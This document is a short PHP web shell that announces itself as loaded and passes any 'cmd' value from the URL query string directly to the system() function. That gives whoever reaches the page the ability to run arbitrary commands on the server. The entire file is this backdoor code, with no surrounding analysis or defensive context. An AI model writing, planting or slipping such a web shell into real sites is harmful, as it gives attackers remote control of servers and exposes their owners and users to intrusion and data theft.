<?php
    echo "Webshell loaded.";
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>